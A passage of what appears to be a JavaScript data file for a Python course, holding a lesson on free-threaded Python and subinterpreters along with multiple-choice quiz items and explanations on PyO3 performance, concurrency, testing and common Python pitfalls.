          q('maturin develop builds your Rust extension successfully and the benchmark shows it slower than the Python it replaced. What do you check first?', [
            'Whether crate-type is set to cdylib in the Cargo.toml file',
            'Whether the module was compiled against the wrong Python ABI tag',
            'Whether it was a debug build, because --release was not passed',
            'Whether the function actually carries the #[pyfunction] attribute',
          ], 2, 'maturin develop defaults to a debug profile that keeps every bounds and overflow check and performs no inlining, which routinely makes Rust an order of magnitude slower than the Python it replaced.'),
          q('A PyO3 function runs a 900 ms pure Rust computation. Four Python threads call it and the wall time is still about 3.6 seconds. What is missing?', [
            'The function needs a #[pyfunction(threaded)] attribute to run concurrently',
            'The computation has to run inside py.allow_threads so the lock is released',
            'The threads should be a ProcessPoolExecutor before any gain is possible',
            'PyO3 holds a per module mutex that has to be disabled in Cargo.toml',
          ], 1, 'An extension function holds the interpreter lock for its whole body unless it explicitly gives it up, so allow_threads is what lets the other three threads run their Rust work at the same time.'),
          q('You publish a single abi3 wheel covering CPython 3.9 and up, but a user on the free threaded build reports that pip is building from source. Why?', [
            'abi3 wheels are a Linux only format, and that user was running macOS',
            'The wheel tag was left as cp39-cp39 rather than being written as abi3',
            'Free threaded interpreters reject any wheel older than their own version',
            'The free threaded build has no stable ABI, so it needs a separate wheel',
          ], 3, 'The limited API that makes abi3 possible is not available on free threaded builds, so pip finds no matching wheel tag and falls back to compiling the sdist.'),
        ]
      ),
      lesson('Free-Threaded Python, Subinterpreters, and True Parallelism', 14, `
Take a pure Python scoring loop over 8 million rows, split it across eight threads, and run it on \`python3.14t\`. Wall time drops from 42 seconds to 6. Then check the total and find it short by a few thousand. Both halves of that result are the lesson.

### Getting one

The free threaded interpreter is a separate binary, not a flag on the normal one.

\`\`\`bash
python3.14t -c "import sys; print(sys._is_gil_enabled())"   # False
python3.14  -c "import sys; print(sys._is_gil_enabled())"   # True
\`\`\`

\`\`\`python
import sysconfig
sysconfig.get_config_var("Py_GIL_DISABLED")     # 1 on a free threaded build
\`\`\`

3.13 shipped it as an experiment and charged roughly 40% on single threaded code. 3.14 made it officially supported and cut that overhead to single digits. Packages still have to opt in, which leads directly to the first thing that will go wrong.

### The failure is silent

A C extension built for the free threaded ABI must declare that it does not need the lock, through a module slot:

\`\`\`c
{Py_mod_gil, Py_MOD_GIL_NOT_USED},
\`\`\`

If it does not declare it, importing that module switches the lock back on for the entire process at runtime. Your benchmark stops scaling, no exception is raised, and nothing in the output says why. One import of an old logging or serialisation extension is enough. Make it a test:

\`\`\`python
import sys
import myapp                     # pulls in everything the service imports
assert sys._is_gil_enabled() is False, "an import re-enabled the GIL"
\`\`\`

### Removing the lock does not make your code safe

\`\`\`python
hits = 0
def bump():
    global hits
    for _ in range(1_000_000):
        hits += 1                # still read, then add, then write
\`\`\`

Chapter 6 explained why that loses updates. Free threading does not fix it, it makes it far likelier: with a lock the switch could only land between bytecodes and you might get away with it for years, while without one two cores read the same value in the same nanosecond. Built in containers keep their own internal consistency, so a concurrent \`dict\` write will not corrupt the dict or crash the process, but a compound operation still races:

\`\`\`python
if key not in cache:             # two threads can both pass this
    cache[key] = build(key)      # and both call build()
\`\`\`

Locks, queues, or sharing nothing. The same three answers as before, now with teeth.

### Subinterpreters: isolation without a fork

3.14 shipped \`concurrent.interpreters\` (PEP 734). Each interpreter gets its own module state, its own import table, and since 3.12 its own lock, all inside one process.

\`\`\`python
from concurrent.futures import InterpreterPoolExecutor

with InterpreterPoolExecutor(max_workers=4) as pool:
    totals = list(pool.map(score_batch, batches))
\`\`\`

Nothing is shared. Values cross by copy, and only a small set of types (\`int\`, \`str\`, \`bytes\`, \`bool\`, \`None\`, \`memoryview\`, and tuples of those) cross cheaply. Two costs surprise people: every interpreter re-imports everything it needs, so a worker that touches pandas pays that import per interpreter, and any C extension that keeps state in C globals instead of using multi phase initialisation raises \`ImportError\` when a second interpreter tries to load it.

### Choosing

| Option | Parallel CPU | Shared memory | Startup cost | The catch |
|---|---|---|---|---|
| threads, stock build | no | yes | microseconds | one bytecode stream |
| processes | yes | no | tens of ms | pickling, memory per worker |
| subinterpreters | yes | no | a few ms | copy only, patchy extension support |
| free threaded threads | yes | yes | microseconds | your races are real now |

The honest position today: processes still carry most production workloads, free threading is the one to start testing your service against, and subinterpreters are the answer when you want isolation without paying for a fork.
      `,
        [
          q('On python3.14t your CPU bound benchmark scales across all cores until you add one import of an old C extension, after which it drops to single core speed. What happened?', [
            'The module did not declare Py_mod_gil, so importing it re-enabled the lock',
            'The module was built for the standard interpreter and failed to load at all',
            'Free threaded builds serialise every call that enters an extension module',
            'The extension pinned the whole process to one core during initialisation',
          ], 0, 'A free threaded interpreter turns the lock back on at runtime for any module that has not declared Py_MOD_GIL_NOT_USED, and it does so without raising anything, so the only symptom is that scaling disappears.'),
          q('Under the free threaded build, eight threads each run hits += 1 a million times and the total comes out short. Is that an interpreter bug?', [
            'Yes, the free threaded build is required to make integer updates atomic',
            'Yes, the per object locks should have covered the shared counter for you',
            'No, the read, add and write are still three steps and need a lock',
            'No, integers above 256 are never interned so the writes cannot be shared',
          ], 2, 'Removing the global lock does not make a compound operation atomic, so two cores can read the same value and write the same successor, losing an increment exactly as they would on a stock build.'),
          q('What limits how data moves between two subinterpreters running in the same process?', [
            'Only bytes objects can cross, so anything else has to go through a file',
            'Objects are not shared, so values are copied and few types cross cheaply',
            'Data moves freely because the interpreters share one heap and one lock',
            'Every value has to be encoded as JSON before a queue will accept it',
          ], 1, 'Each interpreter owns its objects and its module state, so anything handed across is copied, and only a short list of simple types plus buffers can be passed without a full copy.'),
        ]
      ),
      ],
      [
      q('A service spends 80% of its wall clock time waiting on Postgres responses. Which of these is worth doing first?', [
        'Rewriting the row mapping layer as a Rust extension with PyO3',
        'Rebuilding the service on the free threaded interpreter to use all cores',
        'Replacing the existing worker threads with a pool of subinterpreters',
        'Overlapping the waiting, because almost no time is spent on CPU at all',
      ], 3, 'Native code and parallel interpreters only help work that is bound by CPU, and a process that is idle on a socket four fifths of the time gains from concurrency on the waiting instead.'),
      q('Which single fact explains both why pure Python arithmetic is slow and why a list of ints costs several times the memory of an equivalent array?', [
        'Every value is a separate heap object the interpreter has to dispatch on',
        'The interpreter lock forces each operation to finish before the next starts',
        'Bytecode is interpreted at runtime rather than compiled ahead of time',
        'Reference counting adds an extra write every time a name is read',
      ], 0, 'Boxing every value into a heap object with a header is what forces the per operation type dispatch and what turns a contiguous eight byte number into a pointer plus a scattered 28 byte object.'),
      q('You need to run an existing C extension that keeps its state in C globals across many CPU cores. Which approach actually fits it?', [
        'Subinterpreters, because each one gets a private copy of the module state',
        'Separate processes, because the extension cannot share an address space',
        'Free threaded threads, because the lock no longer serialises those calls',
        'ctypes wrappers, because they release the lock around every foreign call',
      ], 1, 'A module with C globals and no multi phase initialisation refuses to load in a second subinterpreter and is not thread safe once the lock is gone, so only process isolation gives it the one interpreter world it assumes.'),
      q('You wrap a fast C function with ctypes and call it in a loop over 3 million rows, and the program ends up slower than the pure Python version. What fits?', [
        'ctypes keeps the interpreter lock held across the loop, blocking other threads',
        'The system packager compiled that shared library without any optimisation',
        'Per call argument conversion in ctypes costs more than the C work saves',
        'Each row had to be pickled before the foreign function was able to read it',
      ], 2, 'ctypes converts arguments and results through a generic dispatcher on every call, so a few microseconds of overhead multiplied by three million calls easily swamps a function whose real work takes less than that.'),
      ]
    ),
  ],
  final: [
    q('Why does 0.1 + 0.2 == 0.3 evaluate to False?', [
      'Python rounds the result to two decimal places',
      'Floats are binary approximations, so neither operand is exactly the decimal you wrote',
      '== is not defined for floats',
      'The addition happens as integers first',
    ], 1, 'Binary floating point cannot represent 0.1 or 0.2 exactly, so the sum lands slightly off; compare with math.isclose or use Decimal.'),
    q('courses = courses.sort(key=len) — what is courses afterwards?', [
      'The sorted list',
      'None, because .sort() sorts in place and returns nothing',
      'A copy of the original, unsorted',
      'A generator over the sorted values',
    ], 1, '.sort() mutates and returns None; sorted() is the one that returns a new list.'),
    q('Which default parameter value is safe to write directly in a def line?', [
      'basket=[]',
      'options={}',
      'created_at=datetime.now()',
      'basket=None',
    ], 3, 'Defaults are evaluated once at definition time, so only an immutable sentinel like None avoids shared or frozen state.'),
    q('You add a file called random.py to your project and import random now fails oddly. Why?', [
      'Python reserves standard library names',
      'The script directory precedes the standard library on sys.path, so your file wins',
      'The file needs an __init__.py',
      'Only packages may shadow modules',
    ], 1, 'Imports resolve in sys.path order and the current directory comes first, so your module shadows the standard library one.'),
    q('A subclass defines __init__ and never calls super().__init__(). What breaks?', [
      'Nothing; Python calls it automatically',
      'The parent never sets its attributes, so inherited methods raise AttributeError',
      'The subclass cannot be instantiated',
      'Only type hints stop working',
    ], 1, 'Python does not chain initialisers for you; skipping super() leaves the parent half of the object uninitialised.'),
    q('Which dunder method most improves your debugging output for a new class?', [
      '__str__', '__repr__', '__hash__', '__call__',
    ], 1, '__repr__ is what the REPL, lists, and failing assertions display, and __str__ falls back to it when undefined.'),
    q('Which file mode appends without destroying the existing contents?', [
      '"w"', '"a"', '"x"', '"r+"',
    ], 1, '"a" appends to the end; "w" truncates the file to zero the moment it opens.'),
    q('What does raise NewError(...) from err preserve?', [
      'The original exception as the cause, so the traceback shows both failures',
      'The local variables of the failing frame',
      'The exit code of the process',
      'Nothing; it is purely stylistic',
    ], 0, 'Explicit chaining keeps the low-level cause attached to your high-level error instead of discarding the real origin.'),
    q('You need to generate a password-reset token. Which module?', [
      'random', 'secrets', 'uuid4 from uuid', 'hashlib',
    ], 1, 'secrets is the purpose-built module, drawing from the OS cryptographically secure source. random is reconstructible from its own output stream, and uuid4, while random, is a fixed-format identifier rather than a documented secret-generation API.'),
    q('What does @pytest.mark.parametrize give you that a for loop inside one test does not?', [
      'Faster execution',
      'Each case runs and reports as a separate test, so one failure does not hide the rest',
      'Automatic mocking of dependencies',
      'Type checking of the arguments',
    ], 1, 'A loop stops at the first failed assert; parametrize turns each row into its own independently reported test case.'),
    q('cProfile shows one function at 2% of total runtime. You make it 40% faster. How much faster is the program?', [
      'About 40%',
      'About 20%',
      'It depends on the number of cores',
      'About 0.8% — optimise whatever the measurement says is actually hot',
    ], 3, 'A speedup only applies to the share of runtime the function owns, which is why profiling comes before optimising.'),
    q('You call an async function without await. What do you get?', [
      'A coroutine object that never runs, plus a "was never awaited" RuntimeWarning',
      'The return value, computed synchronously',
      'A TypeError at the call site',
      'A Task already scheduled on the running loop',
    ], 0, 'A coroutine only starts executing when it is awaited or wrapped in a task, so the call itself just builds the object.'),
    q('What does @lru_cache require of the function it decorates?', [
      'That it be defined at module level',
      'That it return a JSON-serialisable value',
      'That it be pure and take hashable arguments',
      'That it carry type hints',
    ], 2, 'The arguments become the cache key, so they must hash, and a cached impure function keeps returning the first answer it ever computed.'),
    q('You already run ruff, mypy and pytest locally before every push. Why add them to CI?', [
      'CI runs them faster than a laptop does',
      'A check that is not enforced in CI is optional in practice, and one hurried push puts a broken main branch in front of everyone',
      'GitHub will not merge a pull request without a workflow file',
      'Local tools cannot produce coverage reports',
    ], 1, 'Automation removes the one afternoon somebody skips the checks, which is exactly when the breakage lands.'),
      q('A suite was made fast with a session scoped engine fixture plus pytest -n auto, and now two tests fail intermittently: the one binding port 8000 and the one writing /tmp/report.json. What is going on?', [
      'The session scoped fixture leaks rows across workers, so rollback stops working',
      'Python\'s per process hash seed reorders those two tests on every single run',
      'Each worker is its own process, so both are fighting over one fixed name',
      'xdist refuses to schedule any test that depends on a session scoped fixture',
    ], 2, 'Under xdist several processes run the suite at once, so a hardcoded port or a hardcoded path is a single shared resource with a fixed name and the workers collide on it; binding port 0 and writing under tmp_path gives each worker its own copy.'),
    q('You need a chart of failed checkouts per plan for yesterday, and you also need to open one specific failed checkout end to end. Which arrangement does both without melting the metrics backend?', [
      'A counter labelled by plan and outcome, with user_id and request_id in the logs',
      'A counter labelled by plan, outcome and user_id, and no change to the logging',
      'A gauge holding the mean failure rate, plus one trace kept for every request',
      'Log lines only, sampled at one percent per line, with no counters exported',
    ], 0, 'Series count is the product of the label cardinalities, so identity such as user_id belongs in logs and span attributes rather than on a metric, while a low cardinality counter answers the aggregate question and the request id is what lets you pull one story back out of the logs.'),
    q('Your package accepts anything matching a Storage Protocol, and it also keeps a plugin registry filled by __init_subclass__ on your BaseStorage. A customer ships a class with matching read and write that inherits nothing from you. What is true?', [
      'It fails the type check and is also missing from the registry at run time',
      'It satisfies Storage for the checker but never appears in the registry',
      'Making the Protocol runtime_checkable would also enter it in the registry',
      'It registers on first use, because a Protocol records its implementers',
    ], 1, 'Structural typing only asks whether the named members exist, so the class satisfies the Protocol without importing anything of yours, while __init_subclass__ fires only when a class actually inherits your base, which is why discovery for classes you do not own has to come from entry points instead.'),
    q('A tenant supplied YAML file is read with yaml.load, and one field from it is used to build an export path as Path(EXPORT_ROOT) / value. Which pair of changes addresses two genuinely different risks?', [
      'shlex.quote over the field, and rejecting any field longer than 255 bytes',
      'yaml.safe_load, and resolving the joined path then checking it stays inside',
      'HMAC signing the uploaded file, and switching the join to os.path.join',
      'Autoescaping the field when rendered, and pinning PyYAML with a hash',
    ], 1, 'yaml.load builds arbitrary Python objects from tags such as !!python/object/apply, which is code execution in your process, and separately an absolute or dot dot laden value replaces the base rather than extending it, so safe_load covers the first risk and resolve() plus is_relative_to covers the second.'),
    q('On the free threaded build, eight threads share a plain dict used as a memo cache. The dict never corrupts and no exception is raised, yet build() sometimes runs twice for the same key. What is happening?', [
      'The dict quietly drops one write when two threads insert in the same instant',
      'Without the lock, dict writes became unsynchronised raw memory accesses',
      'An imported C extension re-enabled the lock and reordered the eight threads',
      'The membership test and the assignment are two steps, so both threads pass',
    ], 3, 'Built in containers keep their own internal state consistent, but check then act is two separate operations and nothing stops a second thread from running the test before the first has written, so the pair needs a lock or a single atomic call such as setdefault.'),
    q('You want a Hypothesis property over a pricing rule, but the function holding it loads the catalogue from Postgres and takes about 300 ms per call, so examples keep hitting DeadlineExceeded. What is the right response?', [
      'Set deadline=None so the property keeps running against the real database',
      'Wrap each example in assume() so the slow database calls get discarded',
      'Drop max_examples to five so the whole property finishes inside 200 ms',
      'Extract the calculation into a pure function and point the property at that',
    ], 3, 'The deadline is telling you the property is aimed at the wrong boundary, and moving the rule into a pure function lets Hypothesis run thousands of shrinking examples in milliseconds while one integration test still proves the query works.'),
  ],
});
